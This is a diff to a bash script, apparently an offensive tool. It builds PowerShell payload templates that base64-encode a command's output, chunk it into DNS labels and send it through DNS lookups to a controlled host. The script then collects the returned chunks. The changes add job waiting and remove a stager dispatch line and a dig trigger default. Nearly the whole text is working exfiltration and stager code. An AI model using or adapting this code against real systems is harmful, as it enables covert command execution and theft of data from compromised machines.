@@ -8,7 +8,6 @@ strict_label_charset=1
 outfile=/dev/stdout
 timeout=20
 threads=5
-s_dns_trigger="dig +short"
 
 trap "setsid kill -2 -- -$(ps -o pgid= $$ | grep -o [0-9]*)" EXIT
 
@@ -245,9 +244,9 @@ assign powershell stager_template 'iex((1..%ITERATIONS%|%{%STAGER_DNS_CMD%|%{$_.
 #    assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -replace '\+','-1' -replace '/','-2' -replace '=','-3' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;%DNS_TRIGGER% \$('{0}{1}{2}' -f (\$_ -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')}"
 #}
 
-assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;if((get-job).length -eq %THREADS%){get-job|wait-job -Any};remove-job -state Completed;start-job -scriptblock {param(\$s,\$i) %DNS_TRIGGER% \$('{0}{1}{2}' -f (\$s -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')} -arg \$_,\$i}"
+assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;if((get-job).length -eq %THREADS%){get-job|wait-job -Any};remove-job -state Completed;start-job -scriptblock {param(\$s,\$i) %DNS_TRIGGER% \$('{0}{1}{2}' -f (\$s -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')} -arg \$_,\$i};Get-Job|Wait-Job"
 [[ $strict_label_charset -eq 1 ]] && {
-    assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -replace '\+','-1' -replace '/','-2' -replace '=','-3' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;if((get-job).length -eq %THREADS%){get-job|wait-job -Any};remove-job -state Completed;start-job -scriptblock {param(\$s,\$i) %DNS_TRIGGER% \$('{0}{1}{2}' -f (\$s -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')} -arg \$_,\$i}"
+    assign powershell inner_cmd_template "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -replace '\+','-1' -replace '/','-2' -replace '=','-3' -split '(.{1,%CHUNK_SIZE%})'|?{\$_}|%{\$i+=1;if((get-job).length -eq %THREADS%){get-job|wait-job -Any};remove-job -state Completed;start-job -scriptblock {param(\$s,\$i) %DNS_TRIGGER% \$('{0}{1}{2}' -f (\$s -replace '(.{1,%LABEL_SIZE%})','\$1.'),\$i,'%UNIQUE_DNS_HOST%')} -arg \$_,\$i};Get-Job|Wait-Job"
 }
 
 
@@ -304,7 +303,6 @@ else
     echo "Payload: $inner_cmd"
     
     sleep 3 #wait for nsconfig to start serving
-    echo "$stager"|"$dispatcher" >/dev/null 2>&1 &
 fi
 
 outer_cmd=${outer_cmd_template//'%CMD_B64%'/$cmd_b64}
@@ -316,7 +314,7 @@ nchunks=-1
 postfix="$unique_dns_host"
 all_chunks=()
 last_valid_time=$SECONDS
-while :;do 
+while :;do
     read -t $timeout -u "$dns_data_fd" -r line || break
     [[ $((SECONDS-last_valid_time)) -gt $timeout ]] && break
     if [[ $line == *"${postfix}"* ]]; then
